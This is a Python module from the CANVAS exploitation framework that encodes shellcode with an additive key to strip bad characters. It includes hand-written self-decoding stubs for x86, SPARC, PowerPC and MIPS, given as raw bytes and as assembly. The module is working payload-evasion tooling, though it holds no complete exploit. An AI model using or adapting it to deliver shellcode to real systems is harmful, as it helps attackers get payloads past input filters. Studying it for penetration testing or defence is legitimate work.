#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
Immunity, Inc. 2002
Addencoder.py
"""

"""

TODO:
-----

actually this lib is only designed to work with WORDs (Int32).
in future it will need to work with DWORDS (Int64) as well.
(MIPSEB, IA64, Alpha)

self.decoder=_getencoder <- "encoder/decoder" logic?

"""

import random
import sys, os
sys.path.append("..")
sys.path.append(".")

from exploitutils import *

BigEndian_order = int2str32
LittleEndian_order = int2str32_swapped


keys=[]
keys.append(0x6e9e159cL)
keys.append(0x3e8fba65L)
keys.append(0x8391a11fL)
keys.append(0xbafe1946L)
keys.append(0x09605bebL)
keys.append(0x04e907a4L)
keys.append(0x3c9f1b25L)
keys.append(0x0d3ee60eL)
keys.append(0x7aa4350dL)



"""

        about bootstraps ADDdecode shellcodes
        =====================================

the idea is the following, the ADDencoder will generate you:

     [NewShellcode] = [bootstrap][key0][key1][size0][EncodedCode]

with actually key0, key1, size0 as Int32

NewShellcode is a striped shellcode without some badchars you don't want.

the ADDdecode algo is:

1/ bootstrap
  - get ADDkey = key0 + key1
  - get ADDCodeSize = size0 + ADDkey
        // ADDCodeSize is the number of Int32 in [code], and not the sizeof(code)
  - for i in (0 .. ADDCodeSize)
        DecodedCode[i] = EncodedCode[i] + ADDkey
  - DecodedCode()
2/ continue with DecodedCode()


"""



"""
        ===========
         Intel x86	"when sometimes CISC can be easier"
        ===========

"""

##intel add decoder
#inteldecoder  = "\xeb\x19"		# jmp    +25 <inteldecoder_getpc>
## inteldecoder_gotpc:
#inteldecoder += "\x5b"			# pop    %ebx
#inteldecoder += "\x8b\x33"		# mov    (%ebx),%esi

#inteldecoder += "\x8b\x7b\x04"		# mov    0x4(%ebx),%edi
#inteldecoder += "\x01\xfe"		# add    %edi,%esi
#inteldecoder += "\x8b\x4b\x08"		# mov    0x8(%ebx),%ecx
#inteldecoder += "\x01\xf1"		# add    %esi,%ecx
#inteldecoder += "\x83\xc3\x0c"		# add    $0xc,%ebx
## inteldecoder_loop:
#inteldecoder += "\x01\x33"		# add    %esi,(%ebx)
#inteldecoder += "\x83\xc3\x04"		# add    $0x4,%ebx
#inteldecoder += "\xe2\xf9"		# loop   -5 <inteldecoder_loop>
#inteldecoder += "\xeb\x11"		# jmp    +17 <inteldecoder_decodedcode>
## inteldecoder_getpc:
#inteldecoder += "\xe8\xe2\xff\xff\xff"	# call   -25 <inteldecoder_gotpc>


_inteldecoder_asm="""jmp inteldecoder_getpc
inteldecoder_gotpc:
pop %ebx
mov (%ebx), %esi
mov 0x4(%ebx), %edi
.urlencoded    "%01%fe" // add %edi, %esi 
mov 0x8(%ebx), %ecx
.urlencoded    "%01%f1" // add %esi, %ecx
add $12, %ebx
inteldecoder_loop:
add %esi, (%ebx)
add $4, %ebx
loop inteldecoder_loop
jmp $17
inteldecoder_getpc:
call inteldecoder_gotpc"""



"""
        ===============
         SPARC Solaris
        ===============

"""

#sparc add decoder
#small, but doesn't work if machine is fast enough. :<
#sparcdecoder_old="\x82\x18\x40\x01\x80\xa0\x40\x01\x26\xbf\xff\xff\x26\xbf\xff\xff\x7f\xff\xff\xff\x8a\x18\x40\x01\x9e\x03\xe0\x4c\xf8\x03\xe0\x04\xfa\x03\xe0\x08\xb2\x21\x40\x1c\xb4\x26\x40\x1d\x92\x21\x40\x1a\xfa\x03\xe0\x0c\x94\x02\x40\x1d\x9e\x03\xe0\x0c\xd0\x03\xe0\x04\x90\x02\x40\x08\xd0\x23\xff\xf8\xb6\x03\xff\xf8\x81\xde\xc0\x01\x9e\x03\xe0\x04\x80\xa2\xa0\x01\x16\xbf\xff\xf9\x94\x02\xbf\xff"

if 1:
    #old code
    #144 bytes
    _sparcdecoder ="\x82\x18\x40\x01\x80\xa0\x40\x01"
    _sparcdecoder+="\x26\xbf\xff\xff\x26\xbf\xff\xff"
    _sparcdecoder+="\x7f\xff\xff\xff\x8a\x18\x40\x01"
    _sparcdecoder+="\xbe\x23\xc0\x05\x9e\x03\xe0\x7c"
    _sparcdecoder+="\xf8\x03\xe0\x04\xfa\x03\xe0\x08"
    _sparcdecoder+="\xb2\x21\x40\x1c\xb4\x26\x40\x1d"
    _sparcdecoder+="\x92\x21\x40\x1a\xfa\x03\xe0\x0c"
    _sparcdecoder+="\x94\x02\x40\x1d\x9e\x03\xe0\x0c"
    _sparcdecoder+="\xd0\x03\xe0\x04\x90\x02\x40\x08"
    _sparcdecoder+="\xd0\x23\xff\xf8\x9e\x03\xe0\x04"
    _sparcdecoder+="\x80\xa2\xa0\x01\x16\xbf\xff\xfb"
    _sparcdecoder+="\x94\x02\xbf\xff\x8a\x18\x40\x01"
    _sparcdecoder+="\x82\x21\x7f\x39\xa0\x01\x60\x03"
    _sparcdecoder+="\xe0\x27\xe0\x78\xe0\x27\xe0\x7c"
    _sparcdecoder+="\x90\x07\xe0\x78\x92\x07\xe0\x78"
    _sparcdecoder+="\x91\xd1\x60\x08\xb2\x07\xe0\x78"
    _sparcdecoder+="\x9f\xc6\x60\x08\x8a\x18\x40\x01"
    _sparcdecoder+="\xff\xff\xff\xff\xff\xff\xff\xff"


sparcdecoder_code="""
ta 1
decoder:
!/*this is the standard bn,a trick 4 locating ourselves in memory - 
!courtousy APC's tooltalk*/
!/*we could massage these by adding -constants to make them 
!  not have 0xff in them later*/
!/*clear g1*/
xor  %g1, %g1, %g1

cmp  %g1,%g1
find_location1:
bl,a find_location1-4
find_location1_helper:
bl,a find_location1
call_dest:
call   find_location1_helper 
!/*nop - has an 0x40 in it. Remove later*/
xor  %g1,%g1,%g5
sub %o7,%g5,%i7

!/*offset to seed_data*/
!/*we subtract 4 here so we can add it later and avoid zeros */
add (seed_data-call_dest-4),%o7,%o7

!/*we now have our location in memory - pointing to seed data*/
!/*read seed data and initialize our function*/
!/*store our seed word as 2 words added together*/
!/*o7 is now the location of seeda -4*/
ld [ %o7 +4 ] , %i4
ld [ %o7 + 8 ] , %i5

!/*this is add %o4,%o6,%o1 */
!/*we know g5 is 0 since we cleared it as a nop. Clever? nah. But cool enough for me.*/
sub   %g5,%i4,%i1
sub   %i1,%i5,%i2
!/*now we neg i2 into o1 for the final value*/
sub   %g5,%i2,%o1


!/*o1 now has our seed word*/

!/*apply our function (add) to the encoded size word to get true size*/
!/*size is in words*/
ld [ %o7 + 12], %i5
add %o1,%i5,%o2
!/*o2 now has our size word*/


!/*do the main loop across our data*/
!/*we initialize o7 to point to input data first*/
!/*need to add cache clear bit after the store*/
!/*o7 allways trails where we want to actually put and pull
!  data by 4 to avoid 0's in asm.*/
!/*+12 to account for seed data words and size word*/
add %o7,(12),%o7
mainloop:
ld [%o7 + 4] , %o0
add %o1,%o0,%o0
st %o0, [ %o7 - 8] !/*-16 for one size word and 2 seed data words and one extra word*/


!/* No more flushing - now we use nanosleep
!add %o7,-8,%i3
!*/
!/*we know g1 is zero since we use it for our xor. This avoids
!a bad 00 in the instruction. flushing is VERY important. do
!not tempt the gods of code caches.*/
!/*
!flush %i3+%g1
!*/

add %o7,4,%o7
cmp %o2,1
bge mainloop
add %o2,-1,%o2

!/*nanosleep(1000) so the flush actually works*/
!/*Actually, we're using YIELD here*/
!/*nopes, yield doesn't actually work*/

!/*null out the second argument*/
xor %g1,%g1,%g5
sub %g5,-199,%g1
add 3,%g5,%l0
st  %l0,[%i7+nanosleepnsec-call_dest]
!/*the first arugment is a pointer to our nanosleep structure*/
add %i7,nanosleepsec-call_dest,%o0
add %i7,nanosleepsec-call_dest,%o1
ta %g5+8
add %i7,seed_data-call_dest-8,%i1
call %i1+8
xor %g1,%g1,%g5

!/*our decode is done!*/
!/*jump to ouput data*/
!/*we changed this to make the main loop overwrite
!  our seed_data so we simply continue into it*/
!/* b input_data */
!/* xor  %g1,%g1,%g1 */
!/* nop */

nanosleepsec:
.word 0xffffffff
nanosleepnsec:
.word 0xffffffff

endsploit:

seed_data:
.word 0x41414142 
.word 0x41414143 
input_data:
.word 0x41414242 
code_data:
.word 0x41414343 
"""
#try:
#    sparcdecoder=mosdef.assemble(sparcdecoder_code,"SPARC")
#except:
#    print "Failed to assemble sparc encoder...CRI?"
 


"""
        =========
         PowerPC
        =========

"""

# Our ppc_decodercode use a technique that consist on modifying a "b -4",
# to cheat the cache and force it to flush.
#  
# For the future, the basic idea of the "add" encoder, is that we have 
# two dword "addies" after the decoder. Once you sum this addies, you get the
# -key-. The shellcode is packed this way:
# <size of shellcode> <shellcode>   (both things are encoded by the -key-.
# So, to decoded it, you just decode the size first, and then go for the rest.
#

_ppcdecoder_asm ="""get_PC: 
        xor.    r6,r6,r6
        bnel    get_PC
pc_loc:
        mflr    r31
        addi    r8, r6, 0x161
        add     r31, r31, r8
        subi    r31, r31, 0x101  ! 0x10 after chunks
        lwz     r3, -0xc(r31)    ! key 1     
        lwz     r4, -0x8(r31)    ! key 2   
        lwz     r5, -0x4(r31)    ! size
        add     r3, r3, r4       ! get the final KEY on r3
        add     r5, r3, r5       ! r5 has the undecoded SIZE

        rlwinm  r2, r5, 2,0,29   ! r5*4
        add     r31, r31, r2     ! point r20 to the end of the encoded shellcode
        mtctr   r5               ! put r5 into the ctr for looping
loop:   
        lwz     r4, -4(r31)      ! load dword
        add     r4, r4, r3       ! unencrypt it (add)
        stwu    r4, -4(r31)      ! store it
        bdnz_    loop         

        subi    r4, r8, 0xe1     ! r4 will have 0x80
        stb     r4, -24(r31)     ! transforming the following  b -4 into a
                                 ! lwz r7, -4(r31)
        b       -4
        mtctr   r31              ! jmp to shellcode
        bctr
chunks: 
"""

# ppc 0x7fe00008



"""
        ========================
         MIPS Big/Little Endian
        ========================

"""

# code only tested on simulator! not yet tested in "real-life"
# i oracle there is some another world bigger outside of that simulatrix

# written in little-endian, TODO: write it in big-endian, easier to read

_mipseldecoder  = "\xff\xff\x10\x04" # bltzal  zero,_mipseldecoder
_mipseldecoder += "\x18\x01\xf1\x23" # addi    s1,ra,280
_mipseldecoder += "\x22\x58\xf1\x03" # sub     t3,ra,s1
_mipseldecoder += "\x1a\x01\x6b\x21" # addi    t3,t3,282
_mipseldecoder += "\x38\xff\x29\x8e" # lw      t1,-200(s1)
_mipseldecoder += "\x3c\xff\x2a\x8e" # lw      t2,-196(s1)
_mipseldecoder += "\x40\xff\x32\x8e" # lw      s2,-192(s1)
# possible cache problem here
_mipseldecoder += "\x20\xa0\x2a\x01" # add     s4,t1,t2
_mipseldecoder += "\x24\x01\xf1\x23" # addi    s1,ra,292
_mipseldecoder += "\x20\x90\x54\x02" # add     s2,s2,s4
_mipseldecoder += "\x04\x68\x72\x01" # sllv    t5,s2,t3
_mipseldecoder += "\x20\x88\x2d\x02" # add     s1,s1,t5
# mipseldecoder_loop
_mipseldecoder += "\x38\xff\x3c\x8e" # lw      t4,-200(s1)
_mipseldecoder += "\x26\x78\xef\x01" # >> load delay
_mipseldecoder += "\x20\x60\x94\x01" # add     t4,t4,s4
_mipseldecoder += "\x38\xff\x2c\xae" # sw      t4,-200(s1)
_mipseldecoder += "\xff\xff\x52\x22" # addi    s2,s2,-1
_mipseldecoder += "\x38\xff\x33\x22" # addi    s3,s1,-200
_mipseldecoder += "\xf9\xff\x41\x06" # bgez    s2,mipseldecoder_loop
_mipseldecoder += "\xfc\xff\x31\x22" # addi    s1,s1,-4
_mipseldecoder += "\x09\x48\x60\x02" # jalr    t1,s3
_mipseldecoder += "\x26\x78\xef\x01" # >> branch delay



"""
        ==========================
         ADDEncoder, the real one
        ==========================

"""

def _getencoder(procname):
    self = globals()
    proctable = {'intel': "X86"}
    procname = procname.lower()
    procdecoder = "_%sdecoder" % procname
    if self.has_key(procdecoder):
        return self[procdecoder]
    procdecoder_asm = procdecoder + "_asm"
    uprocname = procname.upper()
    if proctable.has_key(procname):
        uprocname = proctable[procname]
    if self.has_key(procdecoder_asm):
        from MOSDEF import mosdef
        try:
            return mosdef.assemble(self[procdecoder_asm], uprocname)
        except:
            print "Failed to assemble %s encoder... CRI?" % procname
    return ""


#set the seed to something static for debugging
#random.seed(1)
random.seed(os.getpid())

class genericaddencoder:
    def __init__(self):
        self.maxguesses=50000
        self.minimumsize=100
        self.setadd=0
        # generic default is Intel
        self.targetproc="Intel"
        self.decoder=_getencoder('intel')
        self.order=LittleEndian_order
        self.toint=istr2int
        return

    def run(self,filename):
        print "Using ADD Encoder for %s" % self.targetproc
        return self.encode(open(filename,"r").read())

    def getKey(self):
        return self.setadd

    def setbadstring(self,badstring):
        self.badstring=badstring
        return

    def has_bad_char(self,astring):
        i=self.find_bad_char(astring)
        if i==-1:
            return 0
        return 1

    def find_bad_char(self,astring):
        i=0
        while i<len(astring):
            index=self.badstring.find(astring[i])
            if index!=-1:
                #print "Failed on %x at %d"%(ord(ch),index)
                return i
            i+=1
        return -1

    def xordata(self,data,xor,debug=0):
        i=0
        newdata=""
        while i<len(data):
            word=self.toint(data[i:i+4])
            word2=word^xor
            
            devlog("encoder",  "%8.8x->%8.8x"%(uint32(word),uint32(word2)))
            newdata+=self.order(word2)
            i+=4
        return newdata
        
    def encodedata(self,data,debug=0):
        i=0
        newdata=""
        if debug:
            print "Len data="+str(len(data))
        while i<len(data):
            word=self.toint(data[i:i+4])
            word2=csub(word,self.setadd)
            devlog("encoder", "%8.8x->%8.8x"%(uint32(word),uint32(word2)))
            if self.has_bad_char(self.order(word2)):
                if debug:
                    print "What is this bad character doing in word2: %s?"%(prettyprint(self.order(word2)))
            newdata+=self.order(word2)
            i+=4
        #print "Len newdata="+str(len(newdata))
        return newdata
            
    def encode(self,data):
        if self.badstring=="":
            return data

        for c in self.badstring:
            if c in self.decoder:
                print "0x%x is in decoder stub!"%ord(c)
                return ""
            
        mod=4-len(data)%4
        if mod!=4:
            data=data+"\x00"*mod
            
        #length is in words
        length=self.order(len(data)/4)
        print "Encoding 0x%x words of data in addencoder" % (len(data) / 4)
        data=length+data
        (split1,split2)=self.findadditives(data)
        if split1==None:
            print "Error: Did not find split for your shellcode!"
            return ""
        
        split1=self.order(split1)
        split2=self.order(split2)
        result=self.decoder+split1+split2+self.encodedata(data)
        #DEBUG
        #result="\xcc"+result
        return result


    def encodechunk(self,data):
        """
        returns the size and the integer we encoded with
        """

        return (size,integerweencodedwith)
    
    def findadditives(self,data):
        i=0
        j=0
        #we'll look for 50000 words
        self.presets=keys[:]
        while j<self.maxguesses:
            j+=1
            if len(self.presets)>0:
                guess=self.presets.pop()
            else:
                guess=random.randint(0,0x7fffffff-1)

                
            if random.randint(0,2)==1:
                guess=uint32(-guess)
            failed=0
            self.setadd=guess
            guessxor=0
            #print "%d - Trying Guess: %8.8x"%(j,guess)
            newdata=self.encodedata(data)
            if self.find_bad_char(newdata)!=-1:
                #print "Found a bad character, continuing"
                failed=1
                if failed:
                    continue
            #newdata=self.encodedata(data,debug=1)
                
            if not failed:
                print "Sucessful guess is %8x"%uint32(guess)
                (s1,s2)=self.splitadditives(guess)
                if s1==None:
                    continue
                else:
                    #print "Encoder: Key=%8.8x, s1=%8.8x s2=%8.8x."%(guess,s1,s2)
                    self.setadd=guess
                    return (s1,s2)
            
        return (None,None)

    def splitadditives(self,guess):
        j=0
        failed=0
        #we'll look for 50000 words
        #print "Encoder is Splitting: %8.8x"%uint32(guess)
        
        while j<150000:
            j+=1
            guess2=random.randint(0,0x7fffffff-1)
            if random.randint(0,2)==1:
                guess2=-guess2

            result=csub(guess,guess2)
            #print "J=%d"%j
            #print "Result="+str(result)+":%8.8x"%result
            #print "Quess2="+str(guess2)+":%8.8x"%guess2
            
            if self.has_bad_char(self.order(result)+self.order(guess2)):
                failed=1
                #print "Failed"
                continue
            else:
                failed=0
                #print "Found one!"
                break

        if failed:
            print "Failed to split guess: 0x%8.8x"%(guess)
            return (None, None)
        else:
            print "Split %x into %x:%x"%(uint32(guess),uint32(result),uint32(guess2))
            return (result,guess2)        


class inteladdencoder(genericaddencoder):
    """
    Where it started
    """
    def __init__(self):
        genericaddencoder.__init__(self)
        self.targetproc="Intel"
        self.decoder=_getencoder('intel')
        self.order=LittleEndian_order
        self.toint=istr2int


class ppcaddencoder(genericaddencoder):
    """
    Does an additive decoder - similar to the intel version.
    """
    def __init__(self):
        genericaddencoder.__init__(self)
        self.targetproc="PowerPC"
        self.decoder=_getencoder('ppc')
        self.order=BigEndian_order
        self.toint=str2bigendian


class sparcaddencoder(genericaddencoder):
    """
    Does an additive decoder - similar to the intel version, but with our shellcode wrapper
    Currently only works with solaris, due to use of nanosleep for cache flushing 
    (flush opcode was not working, lamely)
    """
    def __init__(self):
        genericaddencoder.__init__(self)
        self.targetproc="Sparc Solaris"
        self.decoder=_getencoder('sparc')
        self.order=BigEndian_order
        self.toint=str2bigendian
        

class mipseladdencoder(genericaddencoder):
    """
    Does an additive decoder - similar to the intel version.
    """
    def __init__(self):
        genericaddencoder.__init__(self)
        self.targetproc="MIPS Little-Endian"
        self.decoder=_getencoder('mipsel')
        #self.order=LittleEndian_order
        self.toint=istr2int


class mipsebaddencoder(genericaddencoder):
    """
    actually only works for MIPS32
    btw, not tested, *theorically*
    """
    def __init__(self):
        genericaddencoder.__init__(self)
        self.targetproc="MIPS Big-Endian"
        self.order=BigEndian_order
        self.toint=str2bigendian
        re_mipseldecoder = _getencoder('mipsel')
        self.decoder=""
        i = 0
        while i < len(re_mipseldecoder):
            # istr2int is correct here because mipseldecoder is in little-endian
            w = istr2int(re_mipseldecoder[i:i+4])
            self.decoder += BigEndian_order(w)
            i += 4


def dumpByType(data, n=4):
    datalen = len(data)
    if n == 2:
        unit = "halfword"
    elif n == 4:
        unit = "word"
    elif n == 8:
        unit = "doubleword"
    elif n == 16:
        unit = "quadword"
    elif n != 1:
         unit = "unknown"

    umsg = ""
    if unit:
        ulen = datalen / n
        umsg = " in %d %s" % (ulen, unit)
        if ulen > 1:
            umsg += "s"
    else:
        unit = "byte"

    print "len: %d B%s" % (datalen, umsg)
    i = 0
    while i < datalen:
        x = istr2int(data[i:i+4])
        print ".%s 0x%8.8x" % (unit, x)
        i += 4

def disp_normal(data):
    print "Data(%s)=%s"%(len(data),hexprint(data))

def disp_c(data):
    print "unsigned char shellcode[] = %s;" % cprint(data)

def disp_asm(data):
    dumpByType(data)

#this stuff happens.
if __name__ == '__main__':
    import getopt
    
    def usage():
        print """
        Add Encoder 1.0, Immunity, Inc.
        usage: addencoder.py -f shellcode_file [ -<mode>] [-d display] | -S
        
            mode are:    i(intel) s(sparc) o(powerpc) M(mipseb) m(mipsel)
            display are: table(default), C(c), ASM(S,s)
            -S displays addcode size.
        """
        sys.exit(2)
    
    print "Running Add Encoder v 1.0"
    print "Copyright Dave Aitel\n"

    app = None
    disp_method=disp_normal
    filename=None
    
    try:
        (opts,args)=getopt.getopt(sys.argv[1:],"f:d:isomMS")
        # about MIPS: 'm' for little-endian, 'M' for big-endian
        # future alpha will get 'a'
    except getopt.GetoptError:
        #print help
        usage()
   
    for o,a in opts:
        if o in ["-f"]:
            port=a
            filename=a
        if o in ["-i"]:
            app=inteladdencoder()
        if o in ["-s"]:
            app=sparcaddencoder()
        # FIXME shouldn't it be "-p" for powerpc?
        # PA-RISC can use concurent too :)
        if o in ["-o"]:
            app=ppcaddencoder()
        if o in ["-m"]:
            app=mipseladdencoder()
        if o in ["-M"]:
            app=mipsebaddencoder()
        # TODO in future
        #if o in ["-a"]:
        #    app=alphaaddencoder()
        if o in ["-d"]:
            if (a == "c" or a == "C"):
                disp_method = disp_c
            elif (a == "s" or a == "S"):
                disp_method = disp_asm
            else:
                print "unknown display method: %s" % a
                usage() 
        if o in ["-S"]:
            print "Shellcode sizes:\n----------------"
            for proc in ["intel", "sparc", "ppc", "mipsel"]:
                print "%s: %d" % (proc, len(_getencoder(proc)))
            print "\ndone."
            sys.exit(0)
    
    if filename == None:
        usage()

    if app == None:
        print "using <intel> as default proc"
        app = inteladdencoder()
    app.badstring="a"
    data=app.run(filename)
    disp_method(data)
